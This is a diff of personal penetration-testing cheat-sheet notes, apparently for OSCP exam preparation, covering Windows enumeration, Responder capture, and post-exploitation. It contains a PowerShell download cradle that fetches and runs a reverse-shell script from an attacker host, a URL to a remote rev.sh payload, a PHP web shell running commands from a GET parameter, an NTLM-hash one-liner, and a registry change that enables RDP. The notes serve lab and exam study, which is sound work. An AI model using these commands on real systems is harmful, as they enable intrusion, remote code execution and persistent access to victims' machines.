@@ -1,16 +1,21 @@
-OSCP
-
 ## WINDOWS ENUM
 - whoami /priv
 - systeminfo(OS NAME, OS VERSION)
 - username:username
 - winPEAS
+	- Check putty session
+   	- Modifiable services/executables
+- Check files
+  	- Get-ChildItem 
+
 
 
 ## Responder: when there's a url input section 
 ```bash
+sudo responder -I tun0
+
 http://192.168.45.176/share/rev.sh
-file://192.168.45.176/test/rev.sh
+file://192.168.45.176/share/rev.sh
 ```
 
 
@@ -21,7 +26,6 @@ https://www.revshells.com/
 
 # Get-NTLM from password
 python -c 'import hashlib,binascii; print binascii.hexlify(hashlib.new("md4", "<% tp.frontmatter["PASSWORD"] %>".encode("utf-16le")).digest())'
-
 
 powershell "IEX(New-Object Net.Webclient).downloadString('http://<% tp.frontmatter["LHOST"] %>:<LPORT>/Invoke-PowerShellTcp.ps1')"
 
@@ -40,6 +44,7 @@ powershell "IEX(New-Object Net.Webclient).downloadString('http://<% tp.frontmatt
 	system([$_GET['cmd']]);
 ?>
 </pre>
+
 
 #enabling RDP
 Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server' -name "fDenyTSConnections" -value 0**
